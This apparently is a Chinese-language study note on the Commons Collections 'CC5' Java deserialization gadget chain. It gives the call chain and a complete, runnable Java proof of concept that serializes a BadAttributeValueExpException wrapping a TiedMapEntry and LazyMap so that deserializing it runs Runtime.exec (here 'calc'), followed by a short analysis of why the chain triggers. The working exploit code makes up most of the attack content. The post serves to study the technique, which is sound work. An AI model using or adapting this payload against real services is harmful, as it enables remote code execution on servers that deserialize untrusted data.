### 调用链

```
/*
	Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
	Requires:
		commons-collections
This only works in JDK 8u76 and WITHOUT a security manager
 */
```

### POC

```java
package org.example;

import javax.management.BadAttributeValueExpException;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC5 {
    public static void main(String args[]) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {

        String cmd = "calc";
        Transformer[] transformers =new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod" ,new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null,new Object[0]}
                ),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{cmd})
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);
        Map map1 = new HashMap();
        LazyMap lazy = (LazyMap) LazyMap.decorate(map1,chain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazy,"1");
        Map map2 = new HashMap();
        BadAttributeValueExpException claz = new BadAttributeValueExpException(map2);

        Class c = claz.getClass();
        Field f = c.getDeclaredField("val");
        f.setAccessible(true);
        f.set(claz,tiedMapEntry);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        ObjectOutputStream out = new ObjectOutputStream(baos);
        out.writeObject(claz);
        out.flush();
        out.close();
        byte[] bytes = baos.toByteArray();

        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);

        ObjectInputStream in = new ObjectInputStream(bais);

        in.readObject();
    }

}

```

### 分析

CC5延续了CC1的调用链，只在开头有一些区别

CC5主要利用点在BadAttributeValueExpException#readObject

![image-20240517152726457](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240517152726457.png)

可以看到调用了toString利用TiedMapEntry触发toStrng方法，

```
    public String toString() {
        return this.getKey() + "=" + this.getValue();
    }
```

跟进getvalue()

```
    public Object getValue() {
        return this.map.get(this.key);
    }
```

调用了get()方法，这里this.map控制为Lazymap即可

+ 关于反射修改

  因为在构造函数时，会自动触发toString，所以我们先传个map2,后续修改回来就好了

